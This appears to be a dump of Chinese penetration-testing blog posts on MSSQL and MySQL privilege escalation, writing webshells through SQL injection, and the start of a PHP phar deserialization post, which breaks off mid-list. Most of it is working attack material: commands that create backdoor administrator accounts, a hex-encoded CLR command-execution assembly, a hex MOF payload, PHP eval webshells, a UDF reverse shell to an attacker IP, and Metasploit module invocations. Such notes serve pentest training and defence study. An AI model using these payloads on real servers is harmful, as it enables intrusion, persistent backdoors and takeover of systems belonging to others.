@shell,'run',null,'C:\\\\windows\\\\system32\\\\cmd.exe /c whoami \u0026gt; C:\\\\Inetpub\\\\wwwroot\\\\tmp.txt';\rsandbox提权 沙盒模式SandBoxMode是一种安全功能。在沙盒模式下，Access只对控件和字段属性中的安全且不含恶意代码的表达式求值。如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。\n例如，诸如Kill和Shell之类的函数可能被用来损坏计算机上的数据和文件，因此它们被视为不安全的。\n 沙盒提权的原理就是jet.oledb（修改注册表）执行系统命令。数据库通过查询方式调用mdb文件，执行参数，绕过系统本身自己的执行命令，实现mdb文件执行命令。\n 利用条件：\n xp_regwrite 可用(一般就是SA权限) 需要Microsoft.Jet.OLEDB.4.0一般在32位系统才可以，64位机需要12.0，较复杂 dnary.mdb和ias.mdb两个文件 在win2003上默认存在，也可自行准备  利用：\n 开启Ad Hoc Distributed Queries组件  exec sp_configure 'show advanced options',1 ;\rreconfigure ;\rexec sp_configure 'Ad Hoc Distributed Queries',1 ;\rreconfigure;\r 恢复对注册表的读写  dbcc addextendedproc ('xp_regread','xpstar.dll')\rdbcc addextendedproc ('xp_regwrite','xpstar.dll')\r 开启沙盒模式  exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',0\r 参数0的含义：\n0：在任何所有者中禁止启用安全模式\n1 ：为仅在允许范围内\n2 ：必须在access模式下\n3：完全开启\n  利用 jet.oledb 执行系统命令写用户  select * from openrowset('microsoft.jet.oledb.4.0' ,';database=c:\\windows\\system32\\ias\\ias.mdb' ,'select shell(\u0026quot;cmd.exe /c net user hack hack123456 /add\u0026quot;)')\rselect * from openrowset('microsoft.jet.oledb.4.0' ,';database=c:\\windows\\system32\\ias\\ias.mdb' ,'select shell(\u0026quot;cmd.exe /c net localgroup administrators hack /add\u0026quot;)')\rMSSQL 模拟登录提权 该漏洞属于配置不当，开发者允许其他登录用户模拟高权限的用户。\n赋予某用户模拟登录权限 # 赋予用户 MyUser1 权限来模拟 MyUser2, MyUser3,及sa\rUSE master;\rGRANT IMPERSONATE ON LOGIN::sa to [MyUser1];\rGRANT IMPERSONATE ON LOGIN::MyUser2 to [MyUser1];\rGRANT IMPERSONATE ON LOGIN::MyUser3 to [MyUser1];\rGO\r查找可模拟登录的用户 以MyUser1登录后，执行查询：\nSELECT distinct b.name\rFROM sys.server_permissions a\rINNER JOIN sys.server_principals b\rON a.grantor_principal_id = b.principal_id\rWHERE a.permission_name = 'IMPERSONATE'\r\r\n模拟用户登录 # 验证模拟前是否为sysadmin权限\rSELECT SYSTEM_USER\rSELECT IS_SRVROLEMEMBER('sysadmin')\r# 模拟sa登录\rEXECUTE AS LOGIN = 'sa'\r# 模拟登录后验证是否为sysadmin权限\rSELECT SYSTEM_USER\rSELECT IS_SRVROLEMEMBER('sysadmin')\r\r\nCLR提权 SQL CLR 是 SQL Server2005 出现的新功能，它将 .NET Framework 中的 CLR 服务注入到 SQL Server 中，让 SQL Server 的部分数据库对象可以使用 .NET Framework 的编程语言进行开发(目前只支持VB.NET和C#)，包括存储过程、用户自定义函数、触发器、 用户自定义类型以及用户自定义聚合函数等功能。\n使用CLR执行系统命令 #启用MSSQL CLR功能\rexec sp_configure 'show advanced options', 1;\rRECONFIGURE;\rExec sp_configure 'clr enabled', 1;\rRECONFIGURE;\r#为了导入了不安全的程序集，我们还需要将数据库标记为安全。\rALTER DATABASE [master] SET TRUSTWORTHY ON;\r#导入程序集，单独执行\rCREATE ASSEMBLY [WarSQLKit] AUTHORIZATION [dbo] FROM 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c0103006643f55f0000000000000000e00022200b013000000e00000006000000000000022d0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000b02c00004f00000000400000b803000000000000000000000000000000000000006000000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002e74657874000000080d000000200000000e000000020000000000000000000000000000200000602e72737263000000b8030000004000000004000000100000000000000000000000000000400000402e72656c6f6300000c0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000e42c00000000000048000000020005005c220000540a00000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000be280e00000a72010000706f0f00000a280e00000a7243000070725300007002281000000a28020000066f0f00000a2a1b300600a40100000100001173040000060a731100000a0b076f1200000a026f1300000a03281400000a2d0c076f1200000a036f1500000a076f1200000a176f1600000a076f1200000a176f1700000a076f1200000a166f1800000a076f1200000a176f1900000a076f1200000a176f1a00000a06731b00000a7d010000040706fe0605000006731c00000a6f1d00000a140c076f1e00000a26076f1f00000a076f2000000a6f2100000a0c076f2200000ade390d280e00000a1b8d160000012516725d000070a2251702a2251803a225197291000070a2251a096f2300000aa2282400000a6f0f00000ade00076f2500000a2d1a280e00000a067b010000046f2600000a6f0f00000a3895000000731b00000a130408281400000a2d091104086f2700000a26067b010000046f2800000a2c20110472970000706f2700000a261104067b010000046f2600000a6f2700000a26280e00000a1c8d16000001251602a2251703a2251872af000070a22519076f2500000a13051205282900000aa2251a7291000070a2251b1104252d0426142b056f2600000aa2282400000a6f0f00000a067b010000046f2600000a2a011000000000870021a80039100000011e02282a00000a2a4e027b01000004046f2b00000a6f2700000a262a42534a4201000100000000000c00000076322e302e35303732370000000005006c00000038030000237e0000a4030000a804000023537472696e6773000000004c080000e80000002355530034090000100000002347554944000000440900001001000023426c6f620000000000000002000001571502000902000000fa013300160000010000001c000000030000000100000005000000050000002b0000000d000000010000000100000003000000010000000000b1020100000000000600ed01ae0306005a02ae03060038019b030f00ce03000006004c01cd020600d001cd020600b101cd0206004102cd0206000d02cd0206002602cd0206007901cd0206009401cd0206003004c6020a0063014e030e0009049b030600df02c602060020036e0406001d01ae030e00ee039b030a007a044e030a0015014e0306008e02c6020e00f7029b030e00c4009b030e0035039b0306000803360006001503360006002700c602000000002d00000000000100010001001000dd030000350001000100030110000100000035000100040006006404740050200000000096005e007800010080200000000096008b001a00020040220000000086189503060004004022000000008618950306000400482200000000830016007d000400000001007d0000000100e400000002001f04000001002e03000002000404090095030100110095030600190095030a00290095031000310095031000390095031000410095031000490095031000510095031000590095031000610095031000710095030600910095030600a1000c011500a90096001000b10029041a007900950306007900e9022d00b900d7001000b10098043200b90011041000b90085043700b900b4003c00b90078023700b9007b033700b90049043700890095030600c90095034200790066004800790043044e007900ed000600790069035200d900810057007900370406008100a8005700b10029045b0079009b00610069008c025700890001016500890095026100e1008c02570069009503060099004c005700200063000b012e000b0084002e0013008d002e001b00ac002e002300b5002e002b00cb002e003300cb002e003b00cb002e004300d1002e004b00e1002e005300cb002e005b00fe0063006b000b012000048000000100000000000000000000000000a00200000200000000000000000000006b005500000000000200000000000000000000006b004000000000000200000000000000000000006b00c60200000000030002000000003c3e635f5f446973706c6179436c617373315f30003c52756e436f6d6d616e643e625f5f3000496e743332003c4d6f64756c653e0053797374656d2e494f0053797374656d2e44617461006765745f44617461006d73636f726c696200436d6445786563006164645f4f757470757444617461526563656976656400636d640052656164546f456e640052756e436f6d6d616e640053656e64006765745f45786974436f6465006765745f4d657373616765007365745f57696e646f775374796c650050726f6365737357696e646f775374796c65007365745f46696c654e616d650066696c656e616d6500426567696e4f7574707574526561644c696e6500417070656e644c696e65006765745f506970650053716c5069706500436f6d70696c657247656e6572617465644174747269627574650044656275676761626c6541747472696275746500417373656d626c795469746c654174747269627574650053716c50726f63656475726541747472696275746500417373656d626c7954726164656d61726b41747472696275746500417373656d626c7946696c6556657273696f6e41747472696275746500417373656d626c79436f6e66696775726174696f6e41747472696275746500417373656d626c794465736372697074696f6e41747472696275746500436f6d70696c6174696f6e52656c61786174696f6e7341747472696275746500417373656d626c7950726f6475637441747472696275746500417373656d626c79436f7079726967687441747472696275746500417373656d626c79436f6d70616e794174747269627574650052756e74696d65436f6d7061746962696c697479417474726962757465007365745f5573655368656c6c4578656375746500546f537472696e67006765745f4c656e6774680057617253514c4b69744d696e696d616c0057617253514c4b69744d696e696d616c2e646c6c0053797374656d0053797374656d2e5265666c656374696f6e00457863657074696f6e006765745f5374617274496e666f0050726f636573735374617274496e666f0053747265616d526561646572005465787452656164657200537472696e674275696c6465720073656e646572004461746152656365697665644576656e7448616e646c6572004d6963726f736f66742e53716c5365727665722e536572766572006765745f5374616e646172644572726f72007365745f52656469726563745374616e646172644572726f72002e63746f720053797374656d2e446961676e6f73746963730053797374656d2e52756e74696d652e436f6d70696c6572536572766963657300446562756767696e674d6f6465730053746f72656450726f63656475726573004461746152656365697665644576656e744172677300617267730050726f63657373007365745f417267756d656e747300617267756d656e747300436f6e636174004f626a6563740057616974466f7245786974005374617274007365745f52656469726563745374616e646172644f7574707574007374644f75747075740053797374656d2e546578740053716c436f6e74657874007365745f4372656174654e6f57696e646f770049734e756c6c4f72456d707479000000004143006f006d006d0061006e0064002000690073002000720075006e006e0069006e0067002c00200070006c006500610073006500200077006100690074002e00000f63006d0064002e00650078006500000920002f006300200000334f00530020006500720072006f00720020007700680069006c006500200065007800650063007500740069006e006700200000053a002000001753007400640020006f00750074007000750074003a0000372000660069006e00690073006800650064002000770069007400680020006500780069007400200063006f006400650020003d0020000000c1b0e79eb8eb6348be1e0c1d83c2d05800042001010803200001052001011111042001010e04000012550500020e0e0e0c0706120c123d0e1241124508042000125d040001020e0420010102052001011161052002011c180520010112650320000204200012690320000e0500010e1d0e0320000805200112450e08b77a5c561934e08903061245040001010e062002011c124d0801000800000000001e01000100540216577261704e6f6e457863657074696f6e5468726f7773010801000200000000001501001057617253514c4b69744d696e696d616c00000501000000000f01000a457975702043454c494b00001c010017687474703a2f2f6579757063656c696b2e636f6d2e747200000c010007312e302e302e3000000401000000d82c00000000000000000000f22c0000002000000000000000000000000000000000000000000000e42c0000000000000000000000005f436f72446c6c4d61696e006d73636f7265652e646c6c0000000000ff25002000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000005c03000000000000000000005c0334000000560053005f00560045005200530049004f004e005f0049004e0046004f0000000000bd04effe00000100000001000000000000000100000000003f000000000000000400000002000000000000000000000000000000440000000100560061007200460069006c00650049006e0066006f00000000002400040000005400720061006e0073006c006100740069006f006e00000000000000b004bc020000010053007400720069006e006700460069006c00650049006e0066006f0000009802000001003000300030003000300034006200300000001a000100010043006f006d006d0065006e007400730000000000000022000100010043006f006d00700061006e0079004e0061006d00650000000000000000004a0011000100460069006c0065004400650073006300720069007000740069006f006e0000000000570061007200530051004c004b00690074004d0069006e0069006d0061006c0000000000300008000100460069006c006500560065007200730069006f006e000000000031002e0030002e0030002e00300000004a001500010049006e007400650072006e0061006c004e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c00000000005400180001004c006500670061006c0043006f007000790072006900670068007400000068007400740070003a002f002f006500790075007000630065006c0069006b002e0063006f006d002e007400720000002a00010001004c006500670061006c00540072006100640065006d00610072006b00730000000000000000005200150001004f0072006900670069006e0061006c00460069006c0065006e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c000000000036000b000100500072006f0064007500630074004e0061006d0065000000000045007900750070002000430045004c0049004b0000000000340008000100500072006f006400750063007400560065007200730069006f006e00000031002e0030002e0030002e003000000038000800010041007300730065006d0062006c0079002000560065007200730069006f006e00000031002e0030002e0030002e003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000c000000043d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;\r#创建存储过程,单独执行\rCREATE PROCEDURE sp_cmdExec @Command [nvarchar](4000) WITH EXECUTE AS CALLER AS EXTERNAL NAME WarSQLKit.StoredProcedures.CmdExec;\r#执行命令\rEXEC sp_cmdExec 'whoami';\r#删除该程序集\rDROP PROCEDURE sp_cmdExec;DROP ASSEMBLY [WarSQLKit];\r","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/mssql/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/mssql/","title":"MSSQL 注入与提权相关"},{"content":"MySQL提权 MySQL权限获取 数据库操作权限 获取数据库操作权限的方法一般有以下几种：\n 3306端口爆破 从网站的数据库配置文件获取明文密码 sqlmap工具的 \u0026ndash;os-shell 基于已知漏洞获取权限  基于注入获取的webshell权限 通过SQL注入写文件以getshell。\n into outfile写文件 general_log写文件  具体原理和细节参见MySQL注入写shell一文。\nHash破解 在有SQL注入情况的情况下，依靠注入查询MySQL用户密码Hash，再进行解密：\n# MySQL\u0026lt;=5.6\rselect host, user, password from mysql.user;\r# MySQL\u0026gt;=5.7\rselect host,user,authentication_string from mysql.user;\r\r\n随后可用在线网站解密。\n已知漏洞利用 yaSSL缓冲区溢出 MSF利用：\nmsf6 \u0026gt; use exploit/windows/mysql/mysql_yassl_hello\rmsf6 \u0026gt; use exploit/linux/mysql/mysql_yassl_hello\rCVE-2012-2122 在知道用户名情况下，多次输入错误的密码(大约每256一次就可蒙对)会有几率可以直接成功登陆进数据库。\n影响范围：\n所有MariaDB和MySQL的5.1.61、5.2.11、5.3.5、5.5.22以下版本都存在漏洞。\n从5.1.62, 5.2.12, 5.3.6, 5.5.23开始的MariaDB版本不受影响。\n从5.1.63, 5.5.24, 5.6.6开始的MySQL版本不受影响。\n利用：\n# Linux shell\rfor i in `seq 1 1000`; do mysql -uroot -pwrong -h 127.0.0.1 ; done\r# MSF模块\rmsf6 \u0026gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdump\r利用之后可dump出MySQL的hash，再进行破解。\nUDF提权 UDF(user-defined function)是MySQL的一个扩展接口，用户可通过自定义函数来扩展MySQL功能，其新加入的功能函数可以直接在SQL语句中调用，类似调用user()、version()等函数一样。\n手动实现 动态链接库 当MySQL\u0026gt;=5.1时，必须将UDF的动态链接库文件放置于 MySQL 安装目录下的 lib\\plugin 文件夹下文件夹下才能创建自定义函数。\n sqlmap中的动态链接库  sqlmap根目录/data/udf/\r\r\n sqlmap中的动态链接库文件是经过编码处理以防止误杀的，不能直接用，可使用自带的解码工具cloak.py进行解码：\n# cloak.py所在目录\rsqlmap根目录/extra/cloak/cloak.py\r# 解码Linux 64位 的动态链接库\rpython3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o udf.so\r  msf中的动态链接库  msf根目录/data/exploits/mysql\r\r\n插件目录 show variables like '%plugin%';\r\r\n 注：\n在Windows下当不存在插件目录时，找到安装目录，可以借助NTFS流创建该文件夹(成功率不高)：\nselect xxx into dumpfile 'C:\\\\PhpStudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin::$index_allocation';\r找MySQL安装目录：\nmysql\u0026gt; select @@basedir;\r 写入动态链接库 前提：\n 存在SQL注入或可操作原生SQL语句 用户有file_priv权限 secure_file_priv 无限制 插件目录对于MySQL用户可写  使用sqlmap上传动态链接库：\nsqlmap -u \u0026quot;http://127.0.0.1/\u0026quot; --data=\u0026quot;id=1\u0026quot; --file-write=\u0026quot;/path/to/lib_mysqludf_sys_64.so\u0026quot; --file-dest=\u0026quot;/usr/lib/mysql/plugin/udf.so\u0026quot;\r手工写入：\n# 直接十六进制写入\rselect 0x..... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';\r# 本地执行SQL语句，直接传路径获取动态链接库的十六进制\rSELECT hex(load_file('/lib_mysqludf_sys_64.so'));\r# 本地执行SQL语句,路径hex编码获取动态链接库的十六进制\rSELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f));\r创建函数-执行命令 CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';\rselect sys_eval('whoami');\r 所获得的权限最终如何仍需要看运行MySQL服务的权限，以什么样的权限运行MySQL服务，获取到的就是相应的权限\n 清理痕迹 drop function sys_eval;\rmsf自动化实现 msf6 \u0026gt; exploit(multi/mysql/mysql_udf_payload) \r\nUDF shell 当目标 MySQL 在内网中，无法直连 MySQL 或者 MySQL 不允许外连，这个时候可以上传一些脚本，通过脚本进行本地连接和操作。\nUDF大马 可上传UDF命令执行大马：https://github.com/echohun/tools/blob/master/大马/udf.php\nNavicat 自带脚本 目标MySQL不允许外连，可以上传navicat自带的 tunnel 隧道脚本：\n\rimage-20220215152223882\r\n\r\n接着使用navicat连接，设置HTTP通道：\n\r\n\r\n成功连接后手动实现UDF提权就可。\n反弹端口提权 UDF提权的另一种用法，所使用的动态链接库是经定制过的，功能更多更加使用：\ncmdshell # 执行cmd\rdownloader # 下载者,到网上下载指定文件并保存到指定目录\ropen3389 # 通用开3389终端服务,可指定端口(不改端口无需重启)\rbackshell # 反弹Shell\rProcessView # 枚举系统进程\rKillProcess # 终止指定进程\rregread # 读注册表\rregwrite # 写注册表\rshut # 关机,注销,重启\rabout # 说明与帮助函数\r在攻击机器上开启NC监听，向目标机器上导入dll，然后创建自定义函数：\nCREATE FUNCTION backshell RETURNS STRING SONAME 'udf.dll';\r反弹shell：\nselect backshell(\u0026quot;IP\u0026quot;, 7777);\rMOF提权 该漏洞比较有历史，基本在Windows Server 2003 的环境下才可以成功。\n原理 提权的原理是 C:/Windows/system32/wbem/mof/ 目录下的 mof 文件每隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 以执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。\n手工实现 mof文件 #pragma namespace(\u0026quot;\\\\\\\\.\\\\root\\\\subscription\u0026quot;) instance of __EventFilter as $EventFilter { EventNamespace = \u0026quot;Root\\\\Cimv2\u0026quot;; Name = \u0026quot;filtP2\u0026quot;; Query = \u0026quot;Select * From __InstanceModificationEvent \u0026quot; \u0026quot;Where TargetInstance Isa \\\u0026quot;Win32_LocalTime\\\u0026quot; \u0026quot; \u0026quot;And TargetInstance.Second = 5\u0026quot;; QueryLanguage = \u0026quot;WQL\u0026quot;; }; instance of ActiveScriptEventConsumer as $Consumer { Name = \u0026quot;consPCSV2\u0026quot;; ScriptingEngine = \u0026quot;JScript\u0026quot;; ScriptText = \u0026quot;var WSH = new ActiveXObject(\\\u0026quot;WScript.Shell\\\u0026quot;)\\nWSH.run(\\\u0026quot;net.exe user hacker P@ssw0rd /add\\\u0026quot;)\\nWSH.run(\\\u0026quot;net.exe localgroup administrators hacker /add\\\u0026quot;)\u0026quot;; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; };\r该payload核心部分就是创建用户并加入管理员组。\n写文件 将该文件内容以hex格式写入到C:/Windows/system32/wbem/mof/ 下：\nselect 0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A into dumpfile \u0026quot;C:/windows/system32/wbem/mof/test.mof\u0026quot;;\r执行成功的的时候，test.mof 会出现在：c:/windows/system32/wbem/good/ 目录下，否则出现在 c:/windows/system32/wbem/bad 目录下。\n痕迹清理 写入后每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果：\n# 停止 winmgmt 服务\rnet stop winmgmt\r# 删除 Repository 文件夹\rrmdir /s /q C:\\Windows\\system32\\wbem\\Repository\\\r# 手动删除 mof 文件\rdel C:\\Windows\\system32\\wbem\\mof\\good\\test.mof /F /S\r# 删除创建的用户\rnet user hacker /delete\r# 重新启动服务\rnet start winmgmt\rmsf自动化实现 MSF自带MOF提权模块，也自带痕迹清理功能：\nmsf6 \u0026gt; use exploit/windows/mysql/mysql_mof\r\r\n启动项提权 常见于 Windows 环境下，当 Windows 的启动项可以被 MySQL 写入的时候，可以使用 MySQL 将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行。\n启动项路径  Windows Server 2003的启动项路径  # 中文系统\rC:\\Documents and Settings\\Administrator\\「开始」菜单\\程序\\启动\rC:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\r# 英文系统\rC:\\Documents and Settings\\Administrator\\Start Menu\\Programs\\Startup\rC:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\r# 开关机项 需要手动建立对应文件夹\rC:\\WINDOWS\\system32\\GroupPolicy\\Machine\\Scripts\\Startup\rC:\\WINDOWS\\system32\\GroupPolicy\\Machine\\Scripts\\Shutdown\r Windows Server 2008 的启动项路径  C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\rC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\r路径已知的话即可写入脚本，支持vbs和exe类型，可以vbs执行一些CMD命令，也可以用exe上线MSF或CS：\nSet WshShell=WScript.CreateObject(\u0026quot;WScript.Shell\u0026quot;)\rWshShell.Run \u0026quot;net user hacker P@ssw0rd /add\u0026quot;, 0\rWshShell.Run \u0026quot;net localgroup administrators hacker /add\u0026quot;, 0\r写入启动项 mysql \u0026gt; select 0x... into dumpfile \u0026quot;C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\test.vbs\u0026quot;;\r写入成功后，等待系统用户重新登录，登录成功的话，自定义脚本就会被执行。\nmsf自动化实现 msf6 \u0026gt; use exploit/windows/mysql/mysql_start_up\r\r\nCVE-2016-6663 这是一个竞争条件漏洞，一个拥有 CREATE/INSERT/SELECT 权限的低权限账户提权成功后可以mysql系统用户身份执行代码。\nexp参考链接：https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html\n影响范围 MySQL 版本需要 \u0026lt;=5.5.51 或 5.6.x \u0026lt;=5.6.32 或 5.7.x \u0026lt;=5.7.14 或 8.x \u0026lt; 8.0.1\nMariaDB 版本需要 \u0026lt;= 5.5.51 或 10.0.x \u0026lt;= 10.0.27 或 10.1.x \u0026lt;= 10.1.17\n利用  先Getshell拿到www-data权限 通过webshell管理工具上传CVE-2016-6663的exp 在交互式shell中编译该exp  gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient\r 执行  # ./mysql-privesc-race 数据库用户名 密码 数据库地址 数据库\r./mysql-privesc-race test 123456 localhost test\r最终可提权为mysql用户。\n 可配合CVE-2016-6664提升为root用户。\n参见：https://xz.aliyun.com/t/1122\n 参考：\nhttps://xz.aliyun.com/t/1122\nhttps://www.sqlsec.com/2020/11/mysql.html\n","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/mysql-1/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/mysql-1/","title":"MySQL 提权"},{"content":"MySQL注入写shell into outfile写shell outfile()\ndumpfile()\n注意点   二者函数的路径不支持hex和char转换，必须由引号包裹\n  outfile函数可以导出多行，dumpfile函数只能导出一行数据\n  outfile函数在将数据写到文件里时有特殊的格式转换，dumpfile函数保持原数据格式\n比如：写入a\\naa\\raaa\noutfile会在将\u0026quot;\\n\u0026quot;转义，并且在文件末尾新加入一行，结果为4行；而dumpfile则是原格式写入，没有转义，没有新增行，结果为三行\n  写入路径中指定的文件必须不存在，即无法覆盖写入\n  前提条件 1. file_priv\n代表用户所具有的文件操作权限\n\r\n2. secure_file_priv\n代表mysql服务器所具有的文件操作权限\n其值在mysql配置文件my.ini中设置，用作限制导入导出\n mysql\u0026gt;=5.5.53默认为NULL，即默认禁止导入导出 mysql\u0026lt;5.5.53默认为空，即默认无限制 当其值=某目录时，即仅允许在该目录下导入导出  查看secure_file_priv\n\r\n3. 知晓绝对路径且有写权限\n利用 # SQL\r?id=-1' union select '\u0026lt;?php phpinfo(); ?\u0026gt;' into outfile '/var/www/html/shell.php';\r?id=1 limit 1 into outfile 'C:/wamp64/www/work/shell.php' lines terminated by '\u0026lt;?php phpinfo() ?\u0026gt;';\r# sqlmap\rsqlmap -u \u0026quot;http://x.x.x.x/?id=x\u0026quot; --file-write=\u0026quot;/tmp/shell.php\u0026quot; --file-dest=\u0026quot;/var/www/html/test/shell.php\u0026quot;\r 注意：\n一般情况下，Linux系统中MySQL用户不拥有站点根目录的写权限，所以无法写入；在Windows环境下成功率更高。\n 日志写shell MySQL 5.0 版本以上会创建日志文件，因此可通过修改日志的全局变量来 getshell\n注意点 日志路径可hex，但是写入日志的内容必须引号包裹，如果内容中被转义加上反斜杠\\，传至数据库会报错\n前提条件   绝对路径\n  file_priv\n  不受secure_file_priv限制了\n  mysql用户有权限开启日志记录和更换日志路径\n  \r\n\r\n 默认路径中如果是文件的相对路径，一般指在MySQL安装目录下生成\n 利用 mysql日志：错误日志、查询日志、慢查询日志、事务日志、二进制日志\n其中可利用的为：慢查询日志和查询日志\n慢查询日志\n记录查询时间超过指定时间(默认10s)的日志\nset global slow_query_log=1;\rset global slow_query_log_file='xxx/logshell.php';\rselect \u0026quot;\u0026lt;?php eval($_POST[log]);?\u0026gt;\u0026quot; from xxx where sleep(11);\r查询日志\nset global general_log='on';\rset global general_log_file='xxx/shell.php';\rselect '\u0026lt;?php @eval($_POST[\u0026quot;log\u0026quot;]); ?\u0026gt;';\r 注意：\n该文件虽然可写入，但创建者是mysql用户\n\r\n假设该文件是.php，访问该文件会出现500状态码，所以大多数在Windows上会成功，而Linux基本不行。\n 读文件 注意点 load_file函数中的路径可以是单引号或0x、char转换的字符，但是路径中的斜杠是/而不是\\\n前提条件 所读文件的绝对路径\nsecure_file_priv\nfile_priv\n","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/mysql-2/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/mysql-2/","title":"MySQL 注入写 shell"},{"content":"PHP反序列化-2 Phar phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在phar manifest 。其中会以序列化的形式存储用户自定义的meta-data。\n\r\nPhar使用示例 手动构建phar文件，需要配置php.ini中phar.readonly选项设置为Off，否则无法生成phar文件。\n\u0026lt;?php class Test { } // 临时的类，用来生成对象即可  $phar = new Phar(\u0026#34;test.phar\u0026#34;); //后缀名必须为phar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //设置stub $o = new Test(); $o-\u0026gt;data = \u0026#39;haha\u0026#39;; $phar-\u0026gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;testHAHA\u0026#34;); //添加要压缩的文件 //签名自动计算 $phar-\u0026gt;stopBuffering(); ?\u0026gt;执行该PHP文件，生成test.phar文件，打开观察meta-data是否被序列化：\n\r\n确实存在序列化，以file_get_contents()函数为例，观察在解析phar文件时得反序列化结果：\n\u0026lt;?php class Test { function __destruct() { echo $this -\u0026gt; data; } } file_get_contents(\u0026#39;phar://test.phar/test.txt\u0026#39;); ?\u0026gt;\r\n那么还有哪些函数在通过phar://伪协议解析phar文件时，会将meta-data进行反序列化呢？\n参考：https://blog.zsxsoft.com/post/38\n总结出：除了下列常见文件系统函数，凡是在实现过程中直接或间接调用了php_stream_open_wrapper，都可能触发phar反序列化漏洞。\n fileatime / filectime 